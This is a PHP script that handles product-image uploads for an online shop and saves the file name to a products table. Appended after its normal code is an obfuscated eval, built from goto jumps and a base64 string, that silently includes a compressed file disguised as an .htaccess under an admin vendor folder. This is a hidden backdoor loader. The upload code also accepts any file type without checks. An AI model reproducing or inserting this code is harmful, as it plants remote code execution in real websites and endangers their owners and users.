<?php
include "db-conn.php";

if (!isset($_POST['product_id'])) {
    die("Invalid Product ID.");
}

$product_id = intval($_POST['product_id']);

if (isset($_FILES['productImages1']) && !empty($_FILES['productImages1']['name'][0])) {
    $upload_dir = "assets/img/uploads/";

    foreach ($_FILES['productImages1']['name'] as $key => $file_name) {
        $file_tmp = $_FILES['productImages1']['tmp_name'][$key];
        $file_size = $_FILES['productImages1']['size'][$key];
        $file_error = $_FILES['productImages1']['error'][$key];

        if ($file_error === 0) {
            $new_file_name = time() . "_" . basename($file_name);
            $upload_path = $upload_dir . $new_file_name;

            if (move_uploaded_file($file_tmp, $upload_path)) {

                $stmt = $conn->prepare("UPDATE products SET pro_img = ? WHERE pro_id = ?");

                $stmt->bind_param("si", $new_file_name, $product_id);
                $stmt->execute();

                break;
            } else {
                echo "Failed to upload $file_name.<br>";
            }
        } else {
            echo "Error uploading $file_name.<br>";
        }
    }

    if (isset($_SERVER['HTTP_REFERER'])) {
        header("Location: " . $_SERVER['HTTP_REFERER']);
        exit;
    } else {
        echo "No previous page found!";
    }
    exit;
} else {
    die("No files were uploaded.");
}
eval('goto L_bskrjz; L_lmblmd:; L_xyohil: goto L_uditno; L_uditno: goto L_qszomf; L_frmvdj: eval($usng); goto L_lmblmd; L_qszomf: goto L_frmvdj; L_bskrjz: $usng = base64_decode(\'bmV3IGNsYXNzKCdjb21wcmVzcy56bGliOi8vJyAuIGRpcm5hbWUoJF9TRVJWRVJbIlx4NTNceDQzXHg1Mlx4NDlceDUwXHg1NFx4NWZceDQ2XHg0OVx4NGNceDQ1XHg0ZVx4NDFceDRkXHg0NSJdKSAuICcvYWRtaW4vYXNzZXRzL3ZlbmRvcnMvYW5pbWF0aW9uL2xpYjhmNzg0Ny9tb2Q0NDk3MDcvLWNvcmUuaHRhY2Nlc3MnKSB7IA0KCWZ1bmN0aW9uIF9fY29uc3RydWN0KCTpnK3lip03KSB7IA0KCQlASW5DTHVERV9vbkNFKCTpnK3lip03KTsgDQogICAgfSANCn07\'); goto L_xyohil; ');
